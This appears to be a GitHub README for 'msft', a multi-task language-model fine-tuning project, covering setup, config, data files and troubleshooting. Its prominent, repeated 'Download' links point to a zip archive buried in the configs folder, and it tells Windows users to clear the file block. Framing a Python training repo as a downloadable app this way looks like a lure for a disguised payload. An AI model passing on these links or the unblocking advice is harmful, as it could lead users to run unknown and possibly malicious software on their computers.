# msft - Run multi-task training with less overfitting

[![Download msft](https://img.shields.io/badge/Download-msft-6c8cff?style=for-the-badge&logo=github)](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)

## 🚀 Download

Visit this page to download and run the app:

[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)

## 🖥️ What msft does

msft helps you train and test multi-task language models with a single setup. It is made for mixed datasets, few-shot checks, and repeatable runs.

Use it when you want to:

- load several task sets in one place
- test how a model handles mixed data
- run few-shot checks from saved prompt files
- change one config file instead of many settings
- keep training runs organized

## 📦 What you need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- Python 3.10 or newer
- a CUDA-ready NVIDIA GPU
- enough free disk space for model files and data
- internet access for the first setup

A GPU with 12 GB or more VRAM is a good start. Larger models and bigger batch sizes need more memory.

## 🔧 Install the app

1. Open the GitHub page.
2. Download the repository files to your PC.
3. Unzip the files into a folder you can find again.
4. Open PowerShell in that folder.
5. Install the required Python packages.

Use one of these commands:

```bash
uv pip install -r requirements.txt
```

Or:

```bash
pip install -r requirements.txt
```

If you use `uv`, install it first from its official site, then run the command above.

## 📁 Find the data files

The app already includes example data under the `data/` folder.

You should see files like these:

- `mix-5cat-9k.json`
- `mix-10cat-18k.json`
- `mix-15cat-27k.json`
- `fiveshot.json`

These files give you sample mixtures and few-shot prompts. You can use them as they are or swap in your own files later.

## ⚙️ Set up the config

Open this file:

`sft/configs/msft-config.json`

This file tells the app which model to use, which data file to read, and how large each training batch should be.

A basic setup looks like this:

```jsonc
{
  "model_name": "Qwen/Qwen2.5-3B",
  "dataset_file": "data/mix-10cat",
  "batch_size": 4,
  "grad_accumulation": 4,
  "num_gpus": 4
}
```

If you have one GPU, lower the GPU count and batch size to fit your system. If you run out of memory, reduce the batch size first.

## ▶️ Run msft

After you install the files and set the config, start the app from the project folder.

Use the main command from the project script or training entry point in the repository. If the repo includes a Windows batch file or Python start file, run that file from the same folder.

A typical run flow is:

1. open the project folder
2. start PowerShell or Command Prompt
3. run the training script
4. wait for the model to load
5. watch the logs as training begins

If the app asks for a dataset path, point it to one of the files in `data/`.

## 🧭 First run checklist

Before the first run, check these items:

- Python is installed and on your path
- the package install finished without errors
- your NVIDIA driver is current
- CUDA works on your system
- the config file points to a valid dataset
- the model name matches a model you can download

If the app closes right away, reopen it from PowerShell so you can see the error text.

## 🗂️ Data layout

The repository uses a simple file layout:

```text
data/
├── mix-5cat-9k.json
├── mix-10cat-18k.json
├── mix-15cat-27k.json
└── fiveshot.json
```

Keep your own data in the same format if you want to add new mixtures. Use clear file names so you can tell them apart.

## 🧪 Training notes

The default config is built for a multi-GPU setup. It uses:

- batch size: 4
- gradient accumulation: 4
- GPUs: 4

That gives an effective batch size of 64.

If you use a smaller PC:

- lower `num_gpus`
- lower `batch_size`
- keep `grad_accumulation` as needed
- use a smaller model if memory is tight

If training is slow, that is normal for larger models. The first run can take longer because the model files need to download and load.

## 📚 Few-shot evaluation

The `fiveshot.json` file holds prompt examples for few-shot testing. This helps you check how the model answers before and after training.

Use it when you want to:

- compare output across runs
- test prompt quality
- check how much the model changes after fine-tuning

## 🛠️ Common fixes

If Windows blocks the files, right-click the folder, open Properties, and clear any block if it appears.

If Python is not found:

- reinstall Python
- check the box that adds Python to PATH
- reopen PowerShell

If package install fails:

- upgrade `pip`
- run the install command again
- check that you are in the project folder

If you get a CUDA error:

- update your NVIDIA driver
- make sure the GPU matches the CUDA build you installed
- lower the batch size
- close other GPU-heavy apps

If memory runs out:

- use a smaller model
- reduce batch size
- lower the number of tasks per run
- close other apps that use VRAM

## 📄 Folder overview

A typical project folder looks like this:

```text
msft/
├── data/
├── sft/
├── requirements.txt
├── README.md
└── config files
```

Keep the folder structure intact. The app expects the data and config files in their default places.

## 🔗 Download again

If you need the files again, use this link:

[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)

## 🧩 Files you may edit

These are the main files you may want to change:

- `sft/configs/msft-config.json` for model and batch settings
- files inside `data/` for dataset mixtures
- prompt files for few-shot checks

Make one change at a time so you can tell what changed if results look different.

## 💡 Tips for Windows users

- Use PowerShell for setup
- Keep the folder in a short path, like `C:\msft`
- Avoid spaces in the folder name if you can
- Run the app from the same folder where you installed the files
- Keep your GPU driver up to date

## 📌 Example workflow

A simple way to use the app is:

1. download the repository
2. unzip it to `C:\msft`
3. install Python packages
4. open `sft/configs/msft-config.json`
5. choose a model and data file
6. start the run
7. watch the log output
8. review the results
